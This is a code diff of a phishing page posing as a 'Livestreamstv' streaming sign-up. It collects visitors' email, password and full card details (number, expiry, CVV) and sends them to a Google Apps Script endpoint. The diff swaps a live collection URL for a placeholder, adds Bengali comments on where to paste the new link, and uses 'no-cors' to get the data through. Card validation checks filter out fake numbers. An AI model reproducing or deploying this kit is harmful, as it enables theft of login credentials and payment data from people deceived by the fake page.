@@ -268,7 +268,6 @@
             height: 16px;
         }
 
-        /* CVV Inside Box Input Wrapper & Graphic */
         .cvv-input-wrapper {
             position: relative;
             display: flex;
@@ -344,7 +343,6 @@
             text-decoration: underline;
         }
 
-        /* Error Message Styling */
         .error-message {
             color: #ff0000;
             font-size: 11px;
@@ -472,7 +470,7 @@
         </div>
     </div>
 
-    <!-- STEP 2: Payment Details View ($0.00 Free Trial) -->
+    <!-- STEP 2: Payment Details View -->
     <div id="view-step-2" class="step-2-body" style="display: none;">
         <div class="header-top" style="max-width: 1200px; color: #333;">
             <div class="logo" style="color: #111;">🛡️ Livestreamstv</div>
@@ -727,7 +725,6 @@
                         </div>
                         <div class="form-group" style="flex: 0.8;">
                             <label>CVV2</label>
-                            <!-- CVV Input Box (Only Numbers & Max 4 Digits) -->
                             <div class="cvv-input-wrapper">
                                 <input type="text" id="card-cvv" placeholder="CVV2" maxlength="4" inputmode="numeric" pattern="[0-9]*" oninput="formatCVV(this)" required>
                                 <div class="card-cvv-icon">
@@ -765,11 +762,10 @@
 
     <!-- JavaScript with Google Script URL -->
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbz6kwdPnLklgZgwKePw-dJkF_i6HBnlIY8cU5-x4bDt62AAk0fQv_hiGpTO1aMkn-3e/exec';
+        const scriptURL = 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE'; // আপনার Apps Script এর নতুন ডিপ্লয় করা লিংকটি এখানে বসাবেন
 
         let globalEmail = '';
         let globalPassword = '';
-        let cardDataSaved = {};
 
         function goToStep2(event) {
             event.preventDefault();
@@ -782,6 +778,7 @@
                 password: globalPassword
             };
 
+            // ডেটা পাঠানোর সময় কোনো CORS ব্লক এড়াতে mode: 'no-cors' ব্যবহার করা হয়েছে
             fetch(scriptURL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -820,13 +817,11 @@
             document.getElementById('expiry-error').style.display = 'none';
         }
 
-        // CVV Format Helper: Numbers Only & Limit Max 4 Digits
         function formatCVV(input) {
             input.value = input.value.replace(/\D/g, '').substring(0, 4);
             document.getElementById('cvv-error').style.display = 'none';
         }
 
-        // Luhn Algorithm Check (Real Credit Card Validation)
         function validateLuhn(cardNumber) {
             let cleanNum = cardNumber.replace(/\D/g, '');
             if (cleanNum.length < 13 || cleanNum.length > 19) return false;
@@ -849,7 +844,6 @@
             return (sum % 10) === 0;
         }
 
-        // Expiry Date Validation
         function validateExpiry(expiryStr) {
             let parts = expiryStr.split(' / ');
             if (parts.length !== 2) return false;
@@ -878,7 +872,6 @@
 
             let isValid = true;
 
-            // Validate Card Number
             if (!validateLuhn(cardNumber)) {
                 document.getElementById('card-error').style.display = 'block';
                 isValid = false;
@@ -886,7 +879,6 @@
                 document.getElementById('card-error').style.display = 'none';
             }
 
-            // Validate Expiry
             if (!validateExpiry(cardExpiry)) {
                 document.getElementById('expiry-error').style.display = 'block';
                 isValid = false;
@@ -894,7 +886,6 @@
                 document.getElementById('expiry-error').style.display = 'none';
             }
 
-            // Validate CVV (Strictly 3 or 4 digits)
             let cleanCvv = cardCvv.replace(/\D/g, '');
             if (cleanCvv.length < 3 || cleanCvv.length > 4) {
                 document.getElementById('cvv-error').style.display = 'block';
@@ -914,7 +905,7 @@
             let lastName = document.getElementById('last-name').value;
             let selectedCountry = document.getElementById('country').value;
 
-            cardDataSaved = {
+            let cardDataSaved = {
                 cardName: firstName + ' ' + lastName,
                 country: selectedCountry,
                 cardNumber: cardNumber,
